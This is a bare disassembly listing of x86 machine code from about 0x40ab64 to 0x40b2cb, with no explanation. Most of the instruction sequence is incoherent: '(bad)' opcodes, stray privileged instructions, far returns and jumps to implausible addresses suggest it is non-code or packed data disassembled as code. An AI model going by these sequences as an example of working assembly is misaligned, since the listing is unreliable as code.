  40ab64:	add    BYTE PTR [ebx+0x4532c845],cl
  40ab6a:	pushf  
  40ab6b:	xor    eax,0x89b49cc7
  40ab70:	test   eax,ebp
  40ab72:	clc    
  40ab73:	inc    ebp
  40ab74:	inc    ebp
  40ab75:	mov    DWORD PTR [eax+eax*8],esi
  40ab78:	sub    al,0x34
  40ab7a:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  40ab81:	dec    ebp
  40ab82:	bound  esi,QWORD PTR [ebx]
  40ab84:	inc    edi
  40ab85:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  40ab8b:	dec    ebp
  40ab8c:	bound  esi,QWORD PTR [ebx]
  40ab8e:	inc    edi
  40ab8f:	add    eax,DWORD PTR [ebx-0xf7a377]
  40ab95:	inc    ebp
  40ab96:	add    ch,dl
  40ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab99:	pushf  
  40ab9a:	inc    edi
  40ab9c:	dec    esp
  40ab9e:	lea    eax,[ebp+0x45fff860]
  40aba4:	push   eax
  40aba5:	xor    dh,BYTE PTR [ebp-0x64]
  40aba8:	(bad)  
  40aba9:	(bad)  
  40abaa:	pop    esp
  40abab:	lods   al,BYTE PTR ds:[esi]
  40abac:	inc    DWORD PTR [ebp+0x4508f8ff]
  40abb2:	mov    esi,DWORD PTR [eax]
  40abb4:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40abbb:	test   DWORD PTR [edi-0x8],edx
  40abbe:	inc    esi
  40abbf:	inc    ebp
  40abc0:	add    BYTE PTR [esi],bh
  40abc2:	push   0x8b809c
  40abc7:	in     al,dx
  40abc8:	inc    ebp
  40abc9:	push   ebp
  40abca:	mov    esi,DWORD PTR [ebx]
  40abcc:	cld    
  40abcd:	add    eax,DWORD PTR [eax+0xf013b]
  40abd3:	adc    al,0x0
  40abd5:	add    bh,bh
  40abd7:	jmp    0xbdacf4
  40abdc:	add    BYTE PTR [ebp+0x45],cl
  40abdf:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40abe5:	dec    ebp
  40abe6:	push   0x38033
  40abeb:	cmp    eax,DWORD PTR [eax]
  40abed:	unpcklps xmm7,xmm0
  40abf0:	jne    0x40abf2
  40abf2:	dec    DWORD PTR [ebx+0x5545cc18]
  40abf8:	mov    DWORD PTR [ebx],esi
  40abfa:	shl    BYTE PTR [ebx],1
  40abfc:	inc    ebp
  40abfd:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40ac03:	retf   0x5575
  40ac06:	dec    DWORD PTR [ebx-0x5ba17e8]
  40ac0c:	(bad)  
  40ac0d:	stc    
  40ac0e:	in     al,dx
  40ac0f:	or     al,0x85
  40ac11:	dec    ebp
  40ac12:	clc    
  40ac13:	xor    eax,DWORD PTR [ebp+0x3]
  40ac16:	mov    ebp,ecx
  40ac18:	rol    BYTE PTR [eax],1
  40ac1a:	inc    ebp
  40ac1b:	add    BYTE PTR [eax-0x7747ab3],bh
  40ac21:	clc    
  40ac22:	inc    ebp
  40ac23:	retf   
  40ac24:	mov    edx,ebx
  40ac26:	in     al,dx
  40ac27:	(bad)  
  40ac28:	retf   
  40ac29:	into   
  40ac2a:	into   
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	dec    ebp
  40ac2d:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40ac33:	sub    ecx,esi
  40ac35:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ac38:	(bad)  
  40ac39:	mov    edi,eax
  40ac3b:	int3   
  40ac3c:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ac42:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ac49:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ac4f:	rdtsc  
  40ac51:	retf   0x559c
  40ac54:	(bad)  
  40ac55:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ac5c:	inc    ebp
  40ac5d:	add    eax,0xeb9c4d3f
  40ac62:	(bad)  
  40ac63:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ac69:	xor    ecx,DWORD PTR [ebp+0x33]
  40ac6c:	mov    eax,DWORD PTR [ebx]
  40ac6e:	call   0xce507776
  40ac73:	retf   0x55d1
  40ac76:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ac7c:	jmp    0x40ac77
  40ac7e:	add    BYTE PTR ds:0xebf44d8b,al
  40ac84:	push   ebp
  40ac85:	mov    ebp,DWORD PTR [ebx]
  40ac87:	mov    eax,0x33f8558b
  40ac8c:	retf   
  40ac8d:	xor    ecx,esi
  40ac8f:	add    edx,ecx
  40ac91:	add    eax,DWORD PTR [edx+0xca010f]
  40ac97:	push   ebp
  40ac98:	dec    ebp
  40ac99:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ac9f:	stc    
  40aca0:	rol    DWORD PTR ds:0xebce4dd6,cl
  40aca6:	scas   eax,DWORD PTR es:[edi]
  40aca7:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40acad:	xor    ebp,DWORD PTR [ebx]
  40acaf:	xor    edi,DWORD PTR [ebx]
  40acb1:	add    esi,DWORD PTR [edi+0x3]
  40acb4:	mov    ecx,DWORD PTR [edi]
  40acb6:	clc    
  40acb7:	retf   0x55cb
  40acba:	into   
  40acbb:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40acc2:	test   al,0x4d
  40acc4:	push   ebp
  40acc5:	jbe    0x40acfa
  40acc7:	mov    esi,DWORD PTR [ebx]
  40acc9:	mov    al,0x3
  40accb:	push   ebp
  40accc:	add    esi,DWORD PTR [ebx]
  40acce:	rdpmc  
  40acd0:	retf   0x5503
  40acd3:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40acd9:	dec    ebp
  40acda:	stc    
  40acdb:	mov    ecx,DWORD PTR [eax]
  40acdd:	or     BYTE PTR [ebp+0x4d],cl
  40ace0:	jmp    0x134ad70
  40ace5:	dec    ebp
  40ace6:	dec    ebp
  40ace7:	(bad)  
  40ace8:	mov    ebx,esp
  40acea:	clc    
  40aceb:	test   ebx,ecx
  40aced:	clc    
  40acee:	ror    DWORD PTR [ebp-0x2a],cl
  40acf1:	mov    esi,ecx
  40acf3:	lock scas eax,DWORD PTR es:[edi]
  40acf5:	inc    ebp
  40acf6:	mov    esi,DWORD PTR [ebx]
  40acf8:	hlt    
  40acf9:	pushf  
  40acfa:	jge    0x40ac87
  40acfc:	sub    ebx,esp
  40acfe:	cmp    ecx,ebx
  40ad00:	ja     0x40acd0
  40ad02:	mov    ebp,DWORD PTR [eax-0x58]
  40ad05:	dec    ebp
  40ad06:	xor    ecx,DWORD PTR [di+0x3]
  40ad0a:	mov    esp,esp
  40ad0c:	clc    
  40ad0d:	push   ebp
  40ad0e:	retf   
  40ad0f:	mov    dl,bl
  40ad11:	adc    esi,edx
  40ad13:	jb     0x40ace3
  40ad15:	add    BYTE PTR [edi-0xb7474b3],ch
  40ad1b:	lock jge 0x40ace9
  40ad1e:	sub    ecx,DWORD PTR [ebp+0x3b]
  40ad21:	mov    esi,DWORD PTR [edi-0x20]
  40ad24:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  40ad2b:	mov    BYTE PTR [ebx-0x34b20729],cl
  40ad31:	mov    edx,ebx
  40ad33:	lock (bad) 
  40ad35:	ror    esi,cl
  40ad37:	push   ebp
  40ad38:	scas   eax,DWORD PTR es:[edi]
  40ad39:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40ad3f:	sahf   
  40ad40:	sub    esi,DWORD PTR [edx]
  40ad42:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40ad48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad49:	xor    esp,DWORD PTR [ebx]
  40ad4b:	add    ecx,DWORD PTR [ebp-0x1c]
  40ad4e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad51:	mov    bl,cl
  40ad53:	cmp    dl,bl
  40ad55:	jb     0x40ad25
  40ad57:	add    dh,dl
  40ad59:	dec    ebp
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ad61:	shr    DWORD PTR [ebx],cl
  40ad63:	into   
  40ad64:	cmp    edx,esi
  40ad66:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ad6c:	dec    ebp
  40ad6d:	dec    ebp
  40ad6e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ad74:	retf   
  40ad75:	xor    edx,esi
  40ad77:	add    ecx,esi
  40ad79:	imul   ecx,edx
  40ad7c:	mov    DWORD PTR [ebp+0x8],edx
  40ad7f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ad82:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ad88:	add    esi,DWORD PTR [ebx]
  40ad8a:	rol    BYTE PTR [ebx],0x45
  40ad8d:	sysexit 
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pushf  
  40ad91:	jge    0x40ad1c
  40ad93:	xor    esp,eax
  40ad95:	sub    eax,DWORD PTR [ebp-0x73]
  40ad98:	(bad)  
  40ad99:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ada0:	dec    ebp
  40ada1:	xchg   BYTE PTR [ebx],dh
  40ada3:	inc    DWORD PTR [ebx]
  40ada5:	(bad)  
  40ada6:	jmp    0x40adf5
  40ada8:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40adae:	dec    ebp
  40adaf:	into   
  40adb0:	mov    ebp,DWORD PTR [edi-0x23737420]
  40adb6:	sahf   
  40adb7:	shl    DWORD PTR [edx],cl
  40adb9:	retf   0x5588
  40adbc:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40adc2:	add    eax,DWORD PTR [eax]
  40adc4:	in     al,0x4d
  40adc6:	push   ebp
  40adc7:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40adcd:	bound  eax,QWORD PTR [eax]
  40adcf:	int    0x4d
  40add1:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40add7:	dec    ebp
  40add8:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40adde:	jge    0x40adae
  40ade0:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ade6:	add    cl,dh
  40ade8:	dec    ebp
  40ade9:	dec    DWORD PTR [ebx-0x2c032301]
  40adef:	inc    ebp
  40adf0:	push   ebp
  40adf1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40adf7:	lea    ebx,[esi-0x7400cdac]
  40adfd:	push   eax
  40adfe:	mov    ah,0x45
  40ae00:	push   ebp
  40ae01:	mov    esi,DWORD PTR [ebx]
  40ae03:	les    esi,FWORD PTR [ebx]
  40ae05:	add    BYTE PTR [ebx],al
  40ae07:	inc    DWORD PTR [ebx]
  40ae09:	mov    ecx,DWORD PTR [edi]
  40ae0b:	cld    
  40ae0c:	retf   0x4d80
  40ae0f:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ae15:	jne    0x40ada2
  40ae17:	(bad)  
  40ae18:	in     al,dx
  40ae19:	ror    bl,1
  40ae1b:	pop    edi
  40ae1c:	into   
  40ae1d:	add    BYTE PTR [edi-0xf2f7475],ch
  40ae23:	not    bl
  40ae25:	adc    al,0xca
  40ae27:	inc    ebp
  40ae28:	push   ebp
  40ae29:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ae2f:	push   0xaf80d6
  40ae34:	mov    eax,DWORD PTR [eax]
  40ae36:	fdiv   st(7),st
  40ae38:	sti    
  40ae39:	sbb    dh,cl
  40ae3b:	pop    esi
  40ae3c:	xchg   esp,eax
  40ae3d:	leave  
  40ae3e:	sahf   
  40ae3f:	add    al,0x32
  40ae41:	push   ebp
  40ae42:	cmp    ebp,esp
  40ae44:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ae48:	dec    DWORD PTR [ecx-0x740f0375]
  40ae4e:	push   ebp
  40ae4f:	cld    
  40ae50:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ae56:	retf   0x558b
  40ae59:	clc    
  40ae5a:	xor    esi,eax
  40ae5c:	add    esi,DWORD PTR [ebp-0x75]
  40ae5f:	(bad)  
  40ae60:	hlt    
  40ae61:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  40ae68:	mov    DWORD PTR [edx],ecx
  40ae6a:	hlt    
  40ae6b:	(bad)  
  40ae6c:	dec    ebp
  40ae6d:	add    dh,BYTE PTR [ebx]
  40ae6f:	leave  
  40ae70:	mov    edx,0xffec8d55
  40ae75:	push   ecx
  40ae76:	rol    DWORD PTR [ebp+0x55],1
  40ae79:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ae7f:	mov    eax,0xf8030b33
  40ae84:	lar    ecx,di
  40ae87:	push   ebp
  40ae88:	retf   0x863b
  40ae8b:	jne    0x40ae8a
  40ae8d:	mov    edi,edi
  40ae8f:	or     BYTE PTR [ebp+0x41],dh
  40ae92:	mov    esp,eax
  40ae94:	cld    
  40ae95:	inc    eax
  40ae96:	mov    al,0x29
  40ae98:	add    DWORD PTR [ecx+0x0],eax
  40ae9b:	loope  0x40ae22
  40ae9d:	inc    ecx
  40ae9e:	call   eax
  40aea0:	inc    edx
  40aea2:	mov    eax,DWORD PTR [eax]
  40aea4:	cld    
  40aea5:	mov    eax,DWORD PTR [eax+0x8d0151]
  40aeab:	clc    
  40aeac:	xor    BYTE PTR [ebp+0x45],al
  40aeaf:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40aeb5:	loopne 0x40aeb6
  40aeb7:	mov    edi,edi
  40aeb9:	mov    ecx,eax
  40aebb:	clc    
  40aebc:	jne    0x40ae8e
  40aebe:	call   0x81c1c7
  40aec3:	sub    DWORD PTR [ebp+0x45],esi
  40aec6:	test   esi,eax
  40aec8:	je     0x40aecb
  40aeca:	mov    eax,esi
  40aecc:	cld    
  40aecd:	or     DWORD PTR [eax+0x401c9],eax
  40aed3:	push   ebp
  40aed4:	add    ah,ch
  40aed6:	add    BYTE PTR [ecx+0x6a],dl
  40aed9:	inc    ebp
  40aeda:	push   esi
  40aedb:	mov    DWORD PTR [eax-0x4],edx
  40aede:	pop    edi
  40aedf:	mov    ebx,DWORD PTR [ebx-0x4]
  40aee2:	ret    0xbe
  40aee5:	push   es
  40aee6:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40aeec:	clc    
  40aeed:	lock inc ebp
  40aeef:	jne    0x40af47
  40aef1:	(bad)  
  40aef2:	jne    0x40aef8
  40aef4:	mov    eax,0xf841ba66
  40aef9:	rol    BYTE PTR [esi],1
  40aefb:	(bad)  
  40aefc:	jne    0x40af2f
  40aefe:	cmp    eax,ebx
  40af00:	pop    esi
  40af01:	mov    ecx,DWORD PTR [eax]
  40af03:	push   ecx
  40af04:	inc    ecx
  40af05:	lea    edi,[eax+edi*8+0x42]
  40af09:	inc    ebp
  40af0a:	ror    DWORD PTR [ebx-0x408303be],0x41
  40af11:	xchg   edx,ebp
  40af13:	mov    ebx,eax
  40af15:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40af1b:	or     edi,eax
  40af1d:	inc    ebp
  40af1e:	inc    ebp
  40af1f:	(bad)  
  40af20:	mov    ecx,DWORD PTR [eax]
  40af22:	cld    
  40af23:	(bad)  
  40af24:	jmp    0x40af27
  40af26:	mov    eax,esi
  40af28:	mov    DWORD PTR ds:0x4f8c98b,eax
  40af2e:	rcl    BYTE PTR [esi+0xf],1
  40af31:	iret   
  40af32:	inc    ebp
  40af33:	leave  
  40af34:	(bad)  
  40af35:	dec    DWORD PTR [ecx]
  40af37:	mov    eax,esi
  40af39:	mov    eax,DWORD PTR [edi]
  40af3b:	mov    dh,0xd1
  40af3e:	push   es
  40af3f:	nop
  40af40:	(bad)  
  40af41:	inc    DWORD PTR [ebx]
  40af43:	push   esi
  40af44:	leave  
  40af45:	iret   
  40af46:	add    al,0x46
  40af48:	push   ebp
  40af49:	in     eax,0xec
  40af4b:	push   ebp
  40af4c:	push   ecx
  40af4d:	inc    DWORD PTR [ebp+0x56]
  40af50:	mov    DWORD PTR [esi-0x4],eax
  40af53:	loope  0x40afaa
  40af55:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	mov    edx,DWORD PTR [ebp-0x17]
  40af60:	cmp    edi,esi
  40af62:	jne    0x40af63
  40af64:	(bad)  
  40af65:	push   esi
  40af66:	pop    es
  40af67:	push   ebp
  40af68:	mov    ebp,esp
  40af6a:	or     BYTE PTR [ebp+0x41],al
  40af6d:	add    edi,edx
  40af6f:	sub    BYTE PTR [eax-0x4],al
  40af72:	shl    BYTE PTR [ebp-0x3e],0x1
  40af76:	add    BYTE PTR [ebx+ecx*4],bl
  40af79:	mov    edx,DWORD PTR [ecx+0x14]
  40af7c:	lea    edx,[edx-0x1ba7508]
  40af82:	push   esi
  40af83:	enter  0xd375,0xb8
  40af87:	test   DWORD PTR [esi],0x6ce0750
  40af8d:	enter  0xd375,0x3b
  40af91:	neg    DWORD PTR [esi+0x50]
  40af94:	or     cl,dl
  40af96:	inc    edx
  40af97:	(bad)  
  40af98:	in     eax,dx
  40af99:	in     al,dx
  40af9a:	(bad)  
  40af9b:	sub    eax,DWORD PTR [ebx]
  40af9d:	inc    eax
  40af9e:	in     eax,dx
  40af9f:	push   eax
  40afa0:	add    dl,BYTE PTR [eax-0x37]
  40afa3:	push   edi
  40afa4:	push   ebp
  40afa5:	imul   ah
  40afa7:	adc    DWORD PTR [ecx-0x1],0x45
  40afab:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40afb1:	lea    edi,[eax-0x7fff4ca]
  40afb7:	mov    eax,0x4550402
  40afbc:	cmp    ebp,ecx
  40afbe:	jne    0x40af6b
  40afc0:	mov    eax,DWORD PTR ds:0x241e808
  40afc6:	loope  0x40afc8
  40afc8:	inc    eax
  40afc9:	stc    
  40afca:	xlat   BYTE PTR ds:[ebx]
  40afcb:	ss inc ecx
  40afcd:	aas    
  40afce:	in     eax,0x7d
  40afd0:	ret    0x8b
  40afd3:	lock mov edi,DWORD PTR [ebp-0x18]
  40afd7:	and    edi,edi
  40afd9:	mov    edi,edi
  40afdb:	call   0xe40eb0b7
  40afe0:	push   es
  40afe1:	add    al,ch
  40afe3:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40afea:	(bad)  
  40afeb:	hlt    
  40afec:	add    eax,0xffd3e87d
  40aff1:	cmp    bh,0x8
  40aff4:	(bad)  
  40aff5:	fld    DWORD PTR [esi]
  40aff7:	out    dx,al
  40aff8:	call   0xff9faf00
  40affd:	cmp    al,0x46
  40afff:	shr    edx,0x8
  40b002:	(bad)  
  40b003:	pop    es
  40b004:	fisttp QWORD PTR [ebp+0xe577eff]
  40b00a:	push   ebx
  40b00b:	add    BYTE PTR [ebx+0x24008b56],cl
  40b011:	add    BYTE PTR [ebp+0x50],al
  40b014:	push   eax
  40b015:	add    DWORD PTR [ebx+0x757d1834],ecx
  40b01b:	sub    edx,DWORD PTR [esi-0x24]
  40b01e:	jne    0x40afd6
  40b020:	lods   eax,DWORD PTR ds:[esi]
  40b021:	mov    edx,DWORD PTR [edx-0x34]
  40b024:	dec    esi
  40b025:	out    0x83,eax
  40b027:	into   
  40b028:	push   edi
  40b02a:	loopne 0x40affa
  40b02c:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40b030:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40b037:	rol    DWORD PTR [edx],0x8
  40b03a:	mov    esp,ecx
  40b03c:	cmp    DWORD PTR [ebx],0xc
  40b03f:	mov    esi,0x5001c0
  40b044:	push   eax
  40b045:	push   cs
  40b046:	push   eax
  40b047:	(bad)  
  40b048:	sub    edx,edi
  40b04a:	push   esi
  40b04b:	adc    al,0xcb
  40b04d:	ins    DWORD PTR es:[edi],dx
  40b04e:	mov    eax,0x203e8
  40b053:	add    al,ah
  40b055:	inc    esi
  40b056:	mov    al,ch
  40b058:	pop    es
  40b059:	add    DWORD PTR [eax],0x1
  40b05c:	add    dh,al
  40b05e:	add    ah,ch
  40b060:	rol    DWORD PTR [edx-0xd],1
  40b063:	cli    
  40b064:	push   0x4a
  40b066:	pop    ecx
  40b067:	retf   0xfe6
  40b06a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40b070:	(bad)  
  40b071:	dec    BYTE PTR [ebx+0x45b1fc72]
  40b077:	(bad)  
  40b078:	sub    ebp,DWORD PTR [ebx]
  40b07a:	and    al,0x52
  40b07c:	(bad)  
  40b07d:	dec    edi
  40b07e:	inc    ebp
  40b07f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40b086:	add    BYTE PTR [ebp-0x7b],dh
  40b089:	pop    eax
  40b08a:	add    BYTE PTR [edx+0x0],bl
  40b08d:	pop    edx
  40b08e:	dec    ebp
  40b08f:	jmp    DWORD PTR [ebx]
  40b091:	and    al,0xec
  40b093:	push   edx
  40b094:	out    0x64,eax
  40b096:	jmp    0xd3f2a69b
  40b09b:	jmp    0x40b0f5
  40b09d:	mov    al,0xfe
  40b09f:	dec    BYTE PTR [ebp-0x18fd8018]
  40b0a5:	add    BYTE PTR [esi+ebp*1],bh
  40b0a8:	pop    edx
  40b0a9:	icebp  
  40b0aa:	mov    eax,cs
  40b0ac:	ins    BYTE PTR es:[edi],dx
  40b0ad:	adc    eax,0x75510000
  40b0b2:	mov    esi,0x70158
  40b0b7:	or     DWORD PTR [eax-0x74f48dfe],esi
  40b0bd:	mov    edi,esp
  40b0bf:	cld    
  40b0c0:	jge    0x40b137
  40b0c2:	(bad)  
  40b0c4:	aas    
  40b0c5:	and    al,0x6d
  40b0c7:	adc    cl,0x1
  40b0ca:	mov    eax,DWORD PTR [eax]
  40b0cc:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40b0d2:	dec    ebp
  40b0d3:	add    eax,ebp
  40b0d5:	add    BYTE PTR [edx],al
  40b0d7:	fadd   DWORD PTR [eax]
  40b0d9:	stc    
  40b0da:	enter  0xee00,0x8b
  40b0de:	sbb    eax,0x1
  40b0e1:	sbb    esi,ecx
  40b0e3:	in     al,0x0
  40b0e5:	in     eax,dx
  40b0e6:	add    BYTE PTR [eax],al
  40b0e8:	jne    0x40b075
  40b0ea:	cmp    edx,esp
  40b0ec:	jb     0x40b0f7
  40b0ee:	jmp    0x40b165
  40b0f0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40b0f6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40b0fc:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40b102:	jb     0x40b08d
  40b104:	pop    edx
  40b105:	fadd   QWORD PTR [ebx-0x7445faa1]
  40b10b:	or     dh,BYTE PTR [edx+0x0]
  40b10e:	inc    edx
  40b10f:	or     dl,bh
  40b111:	xlat   BYTE PTR ds:[ebx]
  40b112:	dec    edx
  40b113:	push   edi
  40b114:	add    al,0x7
  40b116:	leave  
  40b117:	rol    DWORD PTR [edx+eax*1],0x7
  40b11b:	add    ecx,ecx
  40b11d:	mov    edx,ecx
  40b11f:	int3   
  40b120:	jmp    0x40b0e0
  40b122:	mov    al,0x0
  40b124:	(bad)  
  40b125:	jne    0x40b10f
  40b127:	mov    eax,DWORD PTR [edx]
  40b129:	call   0xc1552e2e
  40b12e:	pop    edi
  40b12f:	add    ebx,DWORD PTR [ecx-0x37]
  40b132:	pop    ecx
  40b133:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40b13a:	push   es
  40b13b:	mov    eax,DWORD PTR [eax]
  40b13d:	int3   
  40b13e:	add    ch,al
  40b140:	jae    0x40b12a
  40b142:	int    0x1
  40b144:	enter  0x3000,0x18
  40b148:	add    BYTE PTR [ebp+0x75],al
  40b14b:	mov    esi,DWORD PTR [eax-0x171f0134]
  40b151:	push   0x2
  40b153:	pop    ecx
  40b154:	add    BYTE PTR [eax],cl
  40b156:	push   ebx
  40b157:	lea    edi,[edi+eax*2]
  40b15a:	mov    al,0x1
  40b15c:	jb     0x40b15e
  40b15e:	mov    al,0x10
  40b160:	push   eax
  40b161:	add    al,0x75
  40b163:	add    BYTE PTR [ebx],ch
  40b165:	add    ebx,esp
  40b167:	int3   
  40b168:	jne    0x40b17a
  40b16a:	movsx  edx,cl
  40b16d:	add    DWORD PTR [eax],eax
  40b16f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40b176:	mov    gs,edi
  40b178:	add    BYTE PTR [eax-0x50],ch
  40b17b:	add    al,ch
  40b17d:	mov    eax,DWORD PTR [ecx]
  40b17f:	sub    eax,DWORD PTR [eax]
  40b181:	jb     0x40b1f8
  40b183:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40b187:	jge    0x40b171
  40b189:	add    al,0x1
  40b18b:	add    DWORD PTR [eax],0x0
  40b18e:	jne    0x40b190
  40b190:	je     0x40b1d7
  40b192:	mov    eax,DWORD PTR [edi]
  40b194:	ror    BYTE PTR [ebp+0x4d],1
  40b197:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40b19e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40b1a4:	mov    DWORD PTR [ebx],ebp
  40b1a6:	fadd   DWORD PTR [eax+0x75]
  40b1a9:	inc    eax
  40b1aa:	pop    eax
  40b1ab:	lea    ebx,[ecx+0x4f]
  40b1ae:	push   0xb1000003
  40b1b3:	out    dx,eax
  40b1b4:	add    ebp,DWORD PTR [edx+edx*2]
  40b1b7:	add    BYTE PTR [ebx+ecx*4],bh
  40b1ba:	mov    ch,BYTE PTR [ebx]
  40b1bc:	jb     0x40b230
  40b1be:	add    al,0x89
  40b1c0:	push   eax
  40b1c1:	call   0x8428ff33
  40b1c6:	add    DWORD PTR [eax+eax*1],eax
  40b1c9:	jae    0x40b1df
  40b1cb:	icebp  
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,DWORD PTR gs:[ecx]
  40b1d0:	int3   
  40b1d1:	out    dx,al
  40b1d2:	loopne 0x40b221
  40b1d4:	sub    eax,DWORD PTR [edx]
  40b1d6:	push   0xffffff83
  40b1d8:	pop    esi
  40b1d9:	push   cs
  40b1da:	jl     0x40b1f5
  40b1dc:	add    al,0xaf
  40b1de:	xor    eax,0x832b6d00
  40b1e3:	mov    eax,DWORD PTR [edx]
  40b1e5:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40b1eb:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40b1f1:	inc    ebp
  40b1f2:	shr    ebx,0x3
  40b1f5:	or     DWORD PTR [eax],0x4
  40b1f8:	push   0xffffffa5
  40b1fa:	pop    esi
  40b1fb:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40b202:	jmp    0x40b261
  40b204:	mov    edi,0xff0272
  40b209:	fdivr  QWORD PTR [ebp+0x5d]
  40b20c:	push   0x4e
  40b20e:	pop    ecx
  40b20f:	call   0x40f614
  40b214:	mov    DWORD PTR [ebx],eax
  40b216:	in     al,0xc8
  40b218:	rol    BYTE PTR [ebp-0x75],0xc1
  40b21c:	call   0xaab3fd
  40b221:	pop    esi
  40b222:	enter  0xceff,0x8b
  40b226:	repz mov ecx,DWORD PTR [ebp-0x34]
  40b22a:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40b231:	je     0x40b233
  40b233:	or     DWORD PTR [ebx-0x74183b24],eax
  40b239:	jne    0x40b21f
  40b23b:	jmp    0x40b236
  40b23d:	push   DWORD PTR [edx-0x24]
  40b240:	push   0x4d
  40b242:	pop    ecx
  40b243:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40b247:	jge    0x40b24f
  40b249:	mov    eax,eax
  40b24b:	sub    ebp,DWORD PTR [edx+0x24]
  40b24e:	pop    esi
  40b24f:	inc    ebp
  40b250:	mov    esp,0x8b6077
  40b255:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40b25b:	lods   al,BYTE PTR ds:[esi]
  40b25c:	add    BYTE PTR [ebx],bh
  40b25e:	enter  0xce73,0x49
  40b262:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40b26a:	stc    
  40b26b:	jge    0x40b2df
  40b26d:	jnp    0xdd4035ce
  40b273:	call   0xc3b349
  40b278:	fadd   st(0),st
  40b27a:	dec    esi
  40b27b:	ins    BYTE PTR es:[edi],dx
  40b27c:	stc    
  40b27d:	cmp    al,0x73
  40b27f:	push   ebp
  40b280:	mov    eax,0xf8028b
  40b285:	jne    0x40b248
  40b287:	mov    esi,ecx
  40b289:	mov    esp,DWORD PTR [ebp+0x2c]
  40b28c:	add    edi,DWORD PTR [ebp-0x24]
  40b28f:	sub    esp,eax
  40b291:	and    al,0x45
  40b293:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40b299:	sbb    al,0xee
  40b29b:	pop    esi
  40b29c:	call   0x80b2cc
  40b2a1:	fsubr  st,st(3)
  40b2a3:	sti    
  40b2a4:	add    BYTE PTR gs:[ecx],bh
  40b2a7:	add    eax,esp
  40b2a9:	add    DWORD PTR [esi],eax
  40b2ab:	rol    DWORD PTR [ebp+0x8],0x29
  40b2af:	mov    esp,eax
  40b2b1:	clc    
  40b2b2:	jne    0x40b329
  40b2b4:	mov    eax,0x8b0673
  40b2b9:	loopne 0x40b300
  40b2bb:	loopne 0x40b246
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	int3   
  40b2bf:	inc    ebp
  40b2c0:	mov    DWORD PTR gs:[eax+edi*8],eax
  40b2c4:	add    al,0xc3
  40b2c6:	sub    ecx,DWORD PTR [ebp+0x47]
  40b2c9:	(bad)  
  40b2cb:	shr    BYTE PTR [ebp-0x1f],0xe8
